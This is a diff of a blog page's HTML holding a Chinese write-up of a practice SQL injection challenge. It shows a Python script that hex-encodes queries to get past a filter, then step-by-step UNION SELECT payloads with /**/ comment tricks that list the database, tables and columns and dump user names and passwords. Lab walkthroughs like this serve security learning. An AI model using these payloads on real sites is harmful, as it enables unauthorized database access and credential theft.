@@ -127,7 +127,7 @@
             <section class="inner">
                 <section class="inner-main">
                     <div class="post">
-    <article id="post-ckwhbya2o003gs04zd1ov64ug" class="article article-type-post" itemscope
+    <article id="post-ckwrjlyh3003pys4z079mb8sv" class="article article-type-post" itemscope
     itemprop="blogPost">
 
     <div class="article-inner">
@@ -170,7 +170,7 @@
 
             
             <div class="article-busuanzi">
-                有 <span id="busuanzi_value_page_pv">N</span> 人看过
+                    有 <span id="busuanzi_value_page_pv">N</span> 人看过
             </div>
             
 
@@ -180,17 +180,35 @@
             <p><strong>1、</strong>    我也没想到那么多弯弯绕绕的，看到评论区有提示，就照做了，编写url编码脚本，获取注入payload，测试回显位置。</p>
 <span id="more"></span>
 
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="comment">#time:2019/11/9  1:03</span></span><br><span class="line"><span class="comment">#author:White9527</span></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line"></span><br><span class="line"><span class="comment">#查询语句</span></span><br><span class="line">s1 = <span class="string">&quot;&quot;&quot;order by 4&quot;&quot;&quot;</span></span><br><span class="line">s2 = parse.quote(s1,<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">s3 = re.findall(<span class="string">r&#x27;.&#x27;</span>,s2)</span><br><span class="line">j = <span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s3:</span><br><span class="line">	<span class="keyword">if</span> (s3[j]!=<span class="string">&#x27;%&#x27;</span> <span class="keyword">and</span> s3[j-<span class="number">1</span>]!=<span class="string">&#x27;%&#x27;</span> <span class="keyword">and</span> s3[j-<span class="number">2</span>]!=<span class="string">&#x27;%&#x27;</span>):</span><br><span class="line">		s3[j] = <span class="built_in">hex</span>(<span class="built_in">ord</span>(s3[j]))</span><br><span class="line">	j=j+<span class="number">1</span></span><br><span class="line">s4 = <span class="string">&quot;&quot;</span>.join(s3)</span><br><span class="line">s4 = re.sub(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;%&quot;</span>,s4)</span><br><span class="line"><span class="built_in">print</span>(s4)</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-comment"># -*- coding:UTF-8 -*-</span>
+<span class="hljs-comment">#time:2019/11/9  1:03</span>
+<span class="hljs-comment">#author:White9527</span>
+<span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse
+<span class="hljs-keyword">import</span> re 
+
+<span class="hljs-comment">#查询语句</span>
+s1 = <span class="hljs-string">&quot;&quot;&quot;order by 4&quot;&quot;&quot;</span>
+s2 = parse.quote(s1,<span class="hljs-string">&quot;utf-8&quot;</span>)
+s3 = re.findall(<span class="hljs-string">r&#x27;.&#x27;</span>,s2)
+j = <span class="hljs-number">0</span> 
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s3:
+	<span class="hljs-keyword">if</span> (s3[j]!=<span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">and</span> s3[j-<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">and</span> s3[j-<span class="hljs-number">2</span>]!=<span class="hljs-string">&#x27;%&#x27;</span>):
+		s3[j] = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(s3[j]))
+	j=j+<span class="hljs-number">1</span>
+s4 = <span class="hljs-string">&quot;&quot;</span>.join(s3)
+s4 = re.sub(<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&quot;%&quot;</span>,s4)
+<span class="hljs-built_in">print</span>(s4)</code></pre>
 
 <p><img src="https://img-blog.csdnimg.cn/20191113131638359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>2、</strong> 爆库 </p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**/</span><span class="class"><span class="keyword">union</span>/**/<span class="title">select</span>/**/1,<span class="title">database</span>(),3,4</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs cpp"><span class="hljs-comment">/**/</span><span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span>/**/1,<span class="hljs-title">database</span>(),3,4</span></code></pre>
 <p> <img src="https://img-blog.csdnimg.cn/20191113131651484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>3、</strong> 爆表</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**/</span><span class="class"><span class="keyword">union</span>/**/<span class="title">select</span>/**/1,<span class="title">group_concat</span>(<span class="title">table_name</span>),3,4/**/<span class="title">from</span>  	/**/<span class="title">information_schema</span>.<span class="title">tables</span>/**/<span class="title">where</span>/**/<span class="title">table_schema</span>/**/<span class="title">like</span>/**/&#x27;%<span class="title">storm</span>%&#x27;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs cpp"><span class="hljs-comment">/**/</span><span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span>/**/1,<span class="hljs-title">group_concat</span>(<span class="hljs-title">table_name</span>),3,4/**/<span class="hljs-title">from</span>  	/**/<span class="hljs-title">information_schema</span>.<span class="hljs-title">tables</span>/**/<span class="hljs-title">where</span>/**/<span class="hljs-title">table_schema</span>/**/<span class="hljs-title">like</span>/**/&#x27;%<span class="hljs-title">storm</span>%&#x27;</span></code></pre>
 <p><img src="https://img-blog.csdnimg.cn/20191113131702431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p><strong>4、</strong> 爆列</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**/</span><span class="class"><span class="keyword">union</span>/**/<span class="title">select</span>/**/1,<span class="title">group_concat</span>(<span class="title">column_name</span>),3,4/**/<span class="title">from</span>/**/<span class="title">information_schema</span>.<span class="title">columns</span>/**/<span class="title">where</span>/**/<span class="title">table_name</span>/**/<span class="title">like</span>/**/&#x27;<span class="title">stormgroup_member</span>&#x27;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs cpp"><span class="hljs-comment">/**/</span><span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span>/**/1,<span class="hljs-title">group_concat</span>(<span class="hljs-title">column_name</span>),3,4/**/<span class="hljs-title">from</span>/**/<span class="hljs-title">information_schema</span>.<span class="hljs-title">columns</span>/**/<span class="hljs-title">where</span>/**/<span class="hljs-title">table_name</span>/**/<span class="hljs-title">like</span>/**/&#x27;<span class="hljs-title">stormgroup_member</span>&#x27;</span></code></pre>
 <p><img src="https://img-blog.csdnimg.cn/20191113131725343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>5、</strong> 爆值</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**/</span><span class="class"><span class="keyword">union</span>/**/<span class="title">select</span>/**/1,<span class="title">group_concat</span>(<span class="title">name</span>,0<span class="title">x7c</span>,<span class="title">password</span>,0<span class="title">x7e</span>),3,4/**/<span class="title">from</span>/**/<span class="title">stormgroup_member</span></span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs cpp"><span class="hljs-comment">/**/</span><span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span>/**/1,<span class="hljs-title">group_concat</span>(<span class="hljs-title">name</span>,0<span class="hljs-title">x7c</span>,<span class="hljs-title">password</span>,0<span class="hljs-title">x7e</span>),3,4/**/<span class="hljs-title">from</span>/**/<span class="hljs-title">stormgroup_member</span></span></code></pre>
 <p><img src="https://img-blog.csdnimg.cn/20191113131735155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>6、</strong> 登陆获取key</p>
 <p><img src="https://img-blog.csdnimg.cn/20191113131751663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 
